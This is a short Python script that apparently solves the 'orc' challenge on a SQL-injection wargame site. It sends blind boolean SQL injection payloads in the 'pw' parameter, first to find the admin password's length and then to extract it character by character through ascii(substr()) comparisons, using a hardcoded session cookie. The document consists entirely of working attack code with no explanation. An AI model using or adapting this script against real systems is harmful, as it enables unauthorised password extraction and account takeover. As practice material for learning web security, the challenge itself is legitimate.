import requests
cooki = {'PHPSESSID': "obnllqh3qvb9793r8fk8n6jkij"}
url = "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php"
i = 1
key = "Hello admin"
pw_len = 0
while True:
    params = {'pw': "1' or length(pw)="+str(i)+' #'}
    res = requests.get(url, params, cookies=cooki)

    if key in res.text:
        pw_len = i
        break
    i = i + 1
    print i
print pw_len
for j in range(1,pw_len+1):
    for k in range(48, 123):
        if 58 <= k < 65:
            continue
        if 91 <= k < 97:
            continue
        params = {'pw': "1' or id='admin' and ascii(substr(pw,"+str(j)+",1)) = "+str(hex(k))+"#"}
        res2 = requests.get(url, params, cookies=cooki)
       # print res.text
        if key in res2.text:
            print str(j) + " : " + chr(k)
